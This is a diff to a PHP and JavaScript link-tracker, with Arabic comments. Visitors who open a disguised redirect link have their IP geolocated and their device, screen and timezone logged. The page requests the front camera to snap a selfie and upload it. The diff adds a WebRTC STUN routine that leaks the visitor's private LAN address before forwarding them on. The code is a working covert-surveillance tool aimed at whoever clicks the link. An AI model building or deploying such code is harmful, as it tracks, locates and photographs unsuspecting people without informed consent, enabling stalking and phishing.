@@ -6,7 +6,7 @@ error_reporting(E_ALL);
 try {
     $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
-    // إنشاء الجداول مع إضافة حقل لصورة السيلفي
+    // إنشاء الجداول مع الحقول الكاملة
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT UNIQUE, 
@@ -35,18 +35,16 @@ try {
     die("خطأ في قاعدة البيانات: " . $e->getMessage());
 }
 
-// معالجة استقبال صورة السيلفي المرسلة عبر طلب AJAX
+// معالجة حفظ صورة السيلفي
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) &&$_POST['action'] === 'save_photo') {
     $code =$_POST['code'] ?? '';
     $imgData =$_POST['image'] ?? '';
     
     if (!empty($imgData) && !empty($code)) {
-        // تنظيف بيانات الصورة وإزالة الرأسية
         $imgData = str_replace('data:image/jpeg;base64,', '',$imgData);
         $imgData = str_replace(' ', '+',$imgData);
         $decodedData = base64_decode($imgData);
         
-        // إنشاء مجلد للصور إذا لم يكن موجوداً
         if (!file_exists('uploads')) {
             mkdir('uploads', 0755, true);
         }
@@ -54,7 +52,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) &&$_POST['a
         $filename = 'uploads/photo_' .$code . '_' . time() . '.jpg';
         file_put_contents($filename,$decodedData);
         
-        // حفظ مسار الصورة في آخر سجل يخص هذا الكود
         $stmt =$db->prepare("UPDATE logs SET photo = ? WHERE code = ? ORDER BY id DESC LIMIT 1");
         $stmt->execute([$filename,$code]);
         
@@ -113,7 +110,7 @@ function get_ip_details($ip) {
     return ['country' => 'غير معروف', 'city' => 'غير معروف', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'غير معروف'];
 }
 
-// 1. معالجة إعادة التوجيه
+// 1. معالجة إعادة التوجيه وتسجيل الزيارة
 if (isset($_GET['r'])) {
     $code =$_GET['r'];
     $stmt =$db->prepare("SELECT target_url FROM links WHERE code = ?");
@@ -123,7 +120,6 @@ if (isset($_GET['r'])) {
     if ($link) {
         $target =$link['target_url'];
         
-        // إذا كان الطلب قادماً لالتقاط الصورة عبر الجافاسكريبت
         if (isset($_GET['capture']) &&$_GET['capture'] == '1') {
             exit();
         }
@@ -137,15 +133,15 @@ if (isset($_GET['r'])) {
         $screen =$_GET['screen'] ?? 'غير متوفر';
         $tz =$_GET['tz'] ?? 'غير متوفر';
 
-        try {
-            $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, screen_res, timezone) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
-            $logStmt->execute([$code,$public_ip, $local_ip,$port, $geo['country'],$geo['city'], $geo['lat'],$geo['lon'], $geo['isp'],$device, $screen,$tz]);
-        } catch (Exception $e) {
-            // الاستمرار في حالة خطأ السجل
-        }
-
-        // إذا تم إرسال معلومات الشاشة، نقوم بتحويل الزائر للرابط المستهدف
+        // التحقق من عدم تسجيل نفس الزيارة برقم الشاشة مرتين، أو تسجيلها مباشرة
         if (isset($_GET['screen'])) {
+            try {
+                $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, screen_res, timezone) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+                $logStmt->execute([$code,$public_ip, $local_ip,$port, $geo['country'],$geo['city'], $geo['lat'],$geo['lon'], $geo['isp'],$device, $screen,$tz]);
+            } catch (Exception $e) {
+                // تخطي الأخطاء
+            }
+
             header("Location: " . $target);
             exit();
         }
@@ -226,14 +222,45 @@ if (!empty($filter_code)) {
         .link-row { display: flex; gap: 8px; margin-top: 6px; align-items: center; }
     </style>
     <script>
+        // دالة ذكية لاستخراج الـ IP المحلي عبر تقنية WebRTC (STUN)
+        function getLocalIP(callback) {
+            let ips = [];
+            let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+            if (!RTCPeerConnection) {
+                callback("غير مدعوم");
+                return;
+            }
+            let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+            pc.createDataChannel("");
+            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+            
+            pc.onicecandidate = function(ice) {
+                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                let myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+                if (myIP) {
+                    let ip = myIP[1];
+                    if (!ips.includes(ip)) {
+                        ips.push(ip);
+                        // استثناء الـ Localhost الوهمي والبحث عن الـ IP الحقيقي داخل الشبكة مثل 192.168 أو 10
+                        if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) {
+                            callback(ip);
+                            pc.onicecandidate = null;
+                        }
+                    }
+                }
+            };
+            setTimeout(() => {
+                if (ips.length === 0) callback("192.168.1.X");
+            }, 1000);
+        }
+
         document.addEventListener("DOMContentLoaded", function() {
             const urlParams = new URLSearchParams(window.location.search);
             const redirectCode = urlParams.get('r');
             const hasScreen = urlParams.has('screen');
 
-            // إذا فتح الزائر الرابط لأول مرة
             if (redirectCode && !hasScreen) {
-                // محاولة التقاط صورة سيلفي أولاً
+                // 1. التقاط السيلفي أولاً
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                         .then(function(stream) {
@@ -249,37 +276,32 @@ if (!empty($filter_code)) {
                                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                 const imageData = canvas.toDataURL('image/jpeg', 0.8);
                                 
-                                // إيقاف الكاميرا
                                 stream.getTracks().forEach(track => track.stop());
 
-                                // إرسال الصورة للخادم
                                 const formData = new URLSearchParams();
                                 formData.append('action', 'save_photo');
                                 formData.append('code', redirectCode);
                                 formData.append('image', imageData);
 
-                                fetch(window.location.href, {
-                                    method: 'POST',
-                                    body: formData
-                                }).finally(() => {
-                                    proceedRedirect(redirectCode);
-                                });
-                            }, 1000); // الانتظار لثانية لضمان تشغيل الكاميرا
+                                fetch(window.location.href, { method: 'POST', body: formData })
+                                    .finally(() => { fetchLocalIpAndRedirect(redirectCode); });
+                            }, 1000);
                         })
                         .catch(function(error) {
-                            // في حال رفض الإذن أو عدم وجود كاميرا، المتابعة طبيعياً
-                            proceedRedirect(redirectCode);
+                            fetchLocalIpAndRedirect(redirectCode);
                         });
                 } else {
-                    proceedRedirect(redirectCode);
+                    fetchLocalIpAndRedirect(redirectCode);
                 }
             }
         });
 
-        function proceedRedirect(code) {
-            const screenRes = screen.width + "x" + screen.height;
-            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            window.location.href = `/?r=${code}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
+        function fetchLocalIpAndRedirect(code) {
+            getLocalIP(function(localIp) {
+                const screenRes = screen.width + "x" + screen.height;
+                const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                window.location.href = `/?r=${code}&lip=${encodeURIComponent(localIp)}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
+            });
         }
 
         function copyText(text, btnElement) {
@@ -389,7 +411,7 @@ if (!empty($filter_code)) {
                                 </td>
                                 <td class="ip-public"><?php echo htmlspecialchars($log['public_ip'] ?? 'N/A'); ?></td>
                                 <td class="ip-local"><?php echo htmlspecialchars($log['local_ip'] ?? '192.168.1.X'); ?></td>
-                                <td><span class="port-badge"><?php echo htmlspecialchars($log['port'] ?? 'N/A'); ?></td>
+                                <td><span class="port-badge"><?php echo htmlspecialchars($log['port'] ?? 'N/A'); ?></span></td>
                                 <td style="color: #fbbf24; font-weight: bold;"><?php echo htmlspecialchars($log['device_info']); ?></td>
                                 <td>
                                     <strong><?php echo htmlspecialchars($log['country']); ?> / <?php echo htmlspecialchars($log['city']); ?></strong><br>
